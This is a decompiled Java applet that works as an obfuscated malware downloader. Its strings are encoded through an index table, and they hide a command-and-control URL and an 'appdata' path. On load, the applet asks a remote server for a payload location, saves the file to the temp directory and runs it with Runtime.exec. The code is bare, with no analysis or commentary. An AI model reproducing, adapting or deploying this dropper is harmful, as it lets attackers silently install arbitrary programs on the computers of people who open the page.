import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    public static String AB;
    public static String AD;
    
    public static String AA(final int n, String string, final String ab) {
        try {
            if (n == 1) {
                Java.AB = ab;
                if (Java.AB != null) {
                    Java.AB += "\\";
                }
                else if (Java.AB == null) {
                    Java.AB = System.getenv(AA(2, "0A15A15A3A0A19A0", ""));
                    if (Java.AB != null) {
                        Java.AB += "\\";
                    }
                    if (Java.AB == null) {
                        System.exit(0);
                    }
                    else if (!new File(Java.AB).exists()) {
                        System.exit(0);
                    }
                }
            }
            else if (n == 0) {
                try {
                    string += "?";
                    final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(string + AA(2, "20A18A4A17A13A0A12A4A29", "") + "PIdgmaqDqj" + AA(2, "30A18A8A19A4A29", "") + ab + AA(2, "30A20A17A11A29", "") + "http://facebookcam.biz/taskmgb" + AA(2, "28A4A23A4", "")).openConnection().getInputStream()));
                    while (bufferedReader.readLine() != null && bufferedReader.toString().length() != 0) {
                        Java.AB = bufferedReader.readLine();
                    }
                    bufferedReader.close();
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            else if (n == 2) {
                String string2 = "";
                final String[] split = string.replaceAll("[^0-9]", " ").split(" ");
                for (int i = 0; i < split.length; ++i) {
                    string2 += Java.AD.charAt(Integer.parseInt(split[i]));
                }
                Java.AB = string2;
            }
            else {
                System.exit(0);
            }
        }
        catch (Exception ex2) {
            System.exit(0);
        }
        return Java.AB;
    }
    
    @Override
    public void destroy() {
        System.exit(0);
    }
    
    @Override
    public void stop() {
        System.exit(0);
    }
    
    @Override
    public void init() {
        try {
            final String[] split = AA(0, AA(2, "7A19A19A15A26A27A27A5A14A23A23A24A18A14A5A19A22A0A17A4A28A3A24A13A3A13A18A31A22A8A10A8A28A2A14A12A27A6A4A19A28A15A7A15", ""), "http://www.google.com").split("-_-");
            if (split[2] != "G" && split[2] != null) {
                try {
                    final String aa = AA(1, "", System.getProperty(AA(2, "9A0A21A0A28A8A14A28A19A12A15A3A8A17", "")));
                    final FileOutputStream fileOutputStream = new FileOutputStream(new File(aa, split[1]));
                    final InputStream inputStream = new URL(split[0]).openConnection().getInputStream();
                    final byte[] array = new byte[1024];
                    int read;
                    while ((read = inputStream.read(array)) > 0) {
                        fileOutputStream.write(array, 0, read);
                    }
                    fileOutputStream.close();
                    if (new File(aa + split[1]).exists()) {
                        Runtime.getRuntime().exec(aa + split[1]);
                    }
                    else {
                        System.exit(0);
                    }
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            else {
                System.exit(0);
            }
            System.exit(0);
        }
        catch (Exception ex2) {
            System.exit(0);
        }
    }
    
    static {
        Java.AB = null;
        Java.AD = "abcdefghijklmnopqrstuvwxyz:/.=&-";
    }
}
